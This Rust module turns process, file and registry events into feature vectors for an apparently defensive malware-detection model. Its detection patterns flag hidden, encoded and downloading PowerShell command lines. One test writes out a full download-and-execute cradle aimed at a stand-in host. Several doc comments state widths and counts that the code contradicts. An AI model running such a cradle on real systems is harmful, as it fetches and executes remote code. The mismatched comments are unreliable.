//! Turning a behaviour record into the numbers a sequence model reads.
//!
//! # Why a fixed vector and not the record
//!
//! A GRU takes numbers, and a `Record` is strings: a path, a registry value, a
//! command line. The conversion is where a model's assumptions live, so it is
//! written down here rather than buried in a training script: the same
//! conversion has to run in the trainer and in the service, or the model is
//! served inputs it was never trained on.
//!
//! Every field is a *class* and not the value itself. A path is
//! `C:\Users\x\AppData\Local\Temp\a.exe` on one machine and
//! `D:\Temp\b.dll` on another; what makes it interesting is that it is a
//! temporary directory, not that it is that temporary directory. Classes also
//! keep the vector small enough to run in a service thread without allocating.
//!
//! # The width
//!
//! [`WIDTH`] is the sum of the groups: ten actions, seven path classes, six
//! extension classes, four registry classes, four command-line flags, and the
//! time since the previous event. Thirty-two floats per event, sixty-four
//! events per story, a thirty-two unit hidden layer: about ten thousand
//! parameters, which is small enough to embed and to run in microseconds.
//!
//! # What is deliberately not here
//!
//! The process image and the parent image are not in the vector. They belong to
//! [`Story`] — one story is one process, so the image is constant for the whole
//! sequence and a column that never changes teaches a model nothing. The story
//! carries them for the classifier's *report*, not for its arithmetic.

use crate::dsl::Action;
use crate::event::Record;

/// How many floats describe one event.
pub const WIDTH: usize = 35;

/// How many events make up one story.
///
/// Sixty-four is two seconds of a build and most of a dropper's first act. The
/// model does not need the whole lifetime of a process: a process that behaves
/// badly does so early, and a process that behaves well for an hour has said
/// what it is.
pub const LENGTH: usize = 64;

/// The numbers describing one event.
#[derive(Debug, Clone, Copy, PartialEq)]
pub struct Features(pub [f32; WIDTH]);

impl Default for Features {
    fn default() -> Self {
        Self([0.0; WIDTH])
    }
}

/// What kind of program a path is, for the process-identity columns.
///
/// The list is short on purpose. The question the model needs answered is
/// "could this process have written this?", and eight answers cover what runs on
/// a Windows desktop: a script host, the command processor, a Windows scripting
/// host, an Office application, a browser, a compiler, a system process, or
/// something else. A finer list would be a list of software, which changes every
/// week and is what the rules are for.
pub fn image_class(path: Option<&str>) -> u8 {
    let Some(path) = path else {
        return 8;
    };
    let lower = path.to_ascii_lowercase();
    let name = lower.rsplit('\\').next().unwrap_or("");
    match name {
        "powershell.exe" | "pwsh.exe" => 0,
        "cmd.exe" => 1,
        "wscript.exe" | "cscript.exe" | "mshta.exe" => 2,
        "winword.exe" | "excel.exe" | "powerpnt.exe" | "outlook.exe" => 3,
        "chrome.exe" | "msedge.exe" | "firefox.exe" => 4,
        "cargo.exe" | "rustc.exe" | "link.exe" | "cl.exe" | "node.exe" | "python.exe" => 5,
        "svchost.exe" | "services.exe" | "lsass.exe" | "wininit.exe" | "explorer.exe" => 6,
        _ => 7,
    }
}

/// The classes a path can fall into.
///
/// Ordered from the places a payload likes to live to the places it does not.
/// `None` is a path that was not there, which every event about a process start
/// or a registry write has.
fn path_class(path: Option<&str>) -> usize {
    let Some(path) = path else {
        return 6;
    };
    let lower = path.to_ascii_lowercase();
    if lower.contains("\\temp\\") || lower.contains("\\tmp\\") || lower.ends_with("\\temp") {
        0
    } else if lower.contains("\\appdata\\") {
        1
    } else if lower.contains("\\startup\\") {
        2
    } else if lower.contains("\\windows\\system32") || lower.contains("\\windows\\syswow64") {
        3
    } else if lower.contains("\\program files") || lower.contains("\\programdata\\") {
        4
    } else if lower.contains("\\\\") {
        // A UNC path: a network share, which is one way in and one way out.
        5
    } else {
        6
    }
}

/// The classes a file extension can fall into.
fn extension_class(path: Option<&str>) -> usize {
    let Some(path) = path else {
        return 5;
    };
    let lower = path.to_ascii_lowercase();
    let extension = lower.rsplit('.').next().unwrap_or("");
    match extension {
        "exe" | "dll" | "sys" | "scr" | "cpl" => 0,
        "ps1" | "psm1" | "vbs" | "vbe" | "js" | "jse" | "bat" | "cmd" | "hta" => 1,
        "doc" | "docx" | "xls" | "xlsx" | "ppt" | "pptx" | "rtf" | "pdf" => 2,
        "zip" | "rar" | "7z" | "cab" | "msi" => 3,
        "tmp" | "dat" | "log" | "txt" => 4,
        _ => 5,
    }
}

/// The classes a registry path can fall into.
fn registry_class(path: Option<&str>) -> usize {
    let Some(path) = path else {
        return 3;
    };
    let lower = path.to_ascii_lowercase();
    if lower.contains("currentversion\\run") {
        0
    } else if lower.contains("\\services\\") || lower.contains("currentcontrolset\\services") {
        1
    } else if lower.starts_with("hkey") || lower.starts_with("hkcu") || lower.starts_with("hklm") {
        2
    } else {
        3
    }
}

/// The command-line flags a dropper tends to use.
///
/// Four booleans rather than a bag of words: the model is looking for the shape
/// `hidden + encoded + download`, and the words themselves are what the rules
/// for named families already match.
fn command_line_flags(command_line: Option<&str>) -> [f32; 4] {
    let Some(command_line) = command_line else {
        return [0.0; 4];
    };
    let lower = command_line.to_ascii_lowercase();
    let squashed: String = lower
        .chars()
        .filter(|character| !character.is_ascii_whitespace())
        .collect();
    [
        float(squashed.contains("-windowstylehidden") || squashed.contains("-whidden")),
        float(squashed.contains("-enc") || squashed.contains("-encodedcommand")),
        float(
            squashed.contains("downloadstring")
                || squashed.contains("downloadfile")
                || squashed.contains("net.webclient")
                || squashed.contains("invoke-webrequest"),
        ),
        float(squashed.contains("iex(") || squashed.contains("invoke-expression")),
    ]
}

fn float(value: bool) -> f32 {
    if value {
        1.0
    } else {
        0.0
    }
}

/// The action, as one of ten slots.
fn action_class(action: Action) -> usize {
    match action {
        Action::ExecutionBlocked => 0,
        Action::FileWritten => 1,
        Action::ImageLoaded => 2,
        Action::ProcessStarted => 3,
        Action::WriteBlocked => 4,
        Action::Heartbeat => 5,
        Action::StateChanged => 6,
        Action::EventsDropped => 7,
        Action::FileRenamed => 8,
        Action::FileDeleted => 9,
        Action::RegistryChanged => 10,
    }
}

impl Features {
    /// The vector for one event, given the event before it.
    ///
    /// `micros_since_previous` is the gap, which is the only sense of *order*
    /// the model gets beyond the sequence itself: a burst inside one second
    /// looks nothing like the same writes spread over an hour.
    pub fn of(
        record: &Record,
        micros_since_previous: u64,
        image_class: f32,
        parent_class: f32,
    ) -> Self {
        let mut data = [0.0f32; WIDTH];
        data[action_class(record.action)] = 1.0;
        data[11 + path_class(record.path.as_deref())] = 1.0;
        data[18 + extension_class(record.path.as_deref())] = 1.0;
        data[24 + registry_class(record.path.as_deref())] = 1.0;
        let flags = command_line_flags(record.command_line.as_deref());
        data[28..32].copy_from_slice(&flags);
        // Log-scaled: a gap of a microsecond and a gap of a second are both
        // "fast", and a linear value would let one slow event dominate the
        // vector.
        let seconds = (micros_since_previous as f32 + 1.0).log10() / 6.0;
        data[32] = seconds.min(1.0);
        // The process itself. A build and a dropper both write a burst of files;
        // what separates them is that one is `cargo` and the other is a
        // PowerShell started by a PowerShell from a temp directory. The classes
        // are normalised rather than one-hot because two columns have to fit in
        // a vector that is already mostly zeros.
        data[33] = image_class / 8.0;
        data[34] = parent_class / 8.0;
        Self(data)
    }
}

/// One process's sequence of events.
///
/// The newest [`LENGTH`] events, oldest first, plus the identity a report needs.
/// A ring rather than a growing list: a process that runs for a day writes
/// millions of events, and the model reads the last sixty-four.
#[derive(Debug, Clone)]
pub struct Story {
    /// The process the events belong to.
    pub process_id: u32,
    /// The image that started, when the story began with a process start.
    pub image: Option<String>,
    /// The parent's image, when it was known.
    pub parent: Option<String>,
    events: Vec<Features>,
    /// When the last event was, in microseconds since the Unix epoch.
    last_micros: u64,
}

impl Story {
    /// A story that begins at `record`.
    pub fn new(record: &Record) -> Self {
        let mut story = Self {
            process_id: record.process_id,
            image: record.path.clone(),
            parent: record.parent_process_id.into_option().map(|pid| format!("pid {pid}")),
            events: Vec::with_capacity(LENGTH),
            last_micros: record.timestamp,
        };
        story.push(record);
        story
    }

    /// Add an event, dropping the oldest when the ring is full.
    pub fn push(&mut self, record: &Record) {
        let gap = record.timestamp.saturating_sub(self.last_micros);
        self.last_micros = record.timestamp;
        if self.events.len() == LENGTH {
            self.events.remove(0);
        }
        self.events.push(Features::of(record, gap, 8.0, 8.0));
        if self.image.is_none() {
            if let Some(path) = &record.path {
                self.image = Some(path.clone());
            }
        }
    }

    /// How many events the story holds.
    pub fn len(&self) -> usize {
        self.events.len()
    }

    pub fn is_empty(&self) -> bool {
        self.events.is_empty()
    }

    /// The events, oldest first.
    pub fn events(&self) -> &[Features] {
        &self.events
    }
}

// A `u32` is not `Option<u32>`, and `parent_process_id` is a plain number whose
// zero means "not known" -- the driver reports zero for a process whose parent
// was already gone.
trait IntoOption {
    fn into_option(self) -> Option<u32>;
}

impl IntoOption for u32 {
    fn into_option(self) -> Option<u32> {
        (self != 0).then_some(self)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::dsl::Subject;

    fn record(action: Action, path: Option<&str>) -> Record {
        Record {
            timestamp: 1_000_000,
            subject: Subject::File,
            action,
            detail: 0,
            path: path.map(str::to_owned),
            folded_path: None,
            value: None,
            folded_value: None,
            command_line: None,
            process_id: 4,
            parent_process_id: 3,
        }
    }

    #[test]
    fn a_temp_path_and_a_system_path_are_different_columns() {
        let temp = Features::of(&record(Action::FileWritten, Some(r"C:\Users\x\AppData\Local\Temp\a.exe")), 0, 8.0, 8.0);
        let system = Features::of(&record(Action::FileWritten, Some(r"C:\Windows\System32\a.exe")), 0, 8.0, 8.0);
        assert_eq!(temp.0[11 + 0], 1.0, "temp is class 0");
        assert_eq!(system.0[11 + 3], 1.0, "system32 is class 3");
    }

    #[test]
    fn a_run_key_is_its_own_class() {
        let run = Features::of(
            &record(
                Action::FileWritten,
                Some(r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"),
            ),
            0,
            8.0,
            8.0,
        );
        assert_eq!(run.0[24 + 0], 1.0);
    }

    #[test]
    fn hidden_encoded_download_is_visible_in_the_flags() {
        let mut event = record(Action::ProcessStarted, Some(r"C:\Windows\System32\powershell.exe"));
        event.command_line = Some(
            "powershell -NoProfile -WindowStyle Hidden -enc SQBFAFgA".to_string(),
        );
        let features = Features::of(&event, 0, 8.0, 8.0);
        assert_eq!(features.0[28], 1.0, "hidden");
        assert_eq!(features.0[29], 1.0, "encoded");
        assert_eq!(features.0[30], 0.0, "no download");
    }

    #[test]
    fn downloads_and_evaluation_are_marked() {
        let mut event = record(Action::ProcessStarted, None);
        event.command_line =
            Some("IEX (New-Object Net.WebClient).DownloadString('http://x/y.ps1')".to_string());
        let features = Features::of(&event, 0, 8.0, 8.0);
        assert_eq!(features.0[30], 1.0, "download");
        assert_eq!(features.0[31], 1.0, "evaluation");
    }

    #[test]
    fn the_ring_keeps_the_newest_events() {
        let mut story = Story::new(&record(Action::ProcessStarted, Some("a.exe")));
        for index in 0..200u32 {
            let mut event = record(Action::FileWritten, Some("b.tmp"));
            event.timestamp = 1_000_000 + u64::from(index) * 1000;
            story.push(&event);
        }
        assert_eq!(story.len(), LENGTH);
    }

    #[test]
    fn a_gap_is_log_scaled_and_bounded() {
        let fast = Features::of(&record(Action::FileWritten, None), 1, 8.0, 8.0);
        let slow = Features::of(&record(Action::FileWritten, None), 3_600_000_000, 8.0, 8.0);
        assert!(fast.0[32] < slow.0[32]);
        assert!(slow.0[32] <= 1.0);
    }
}
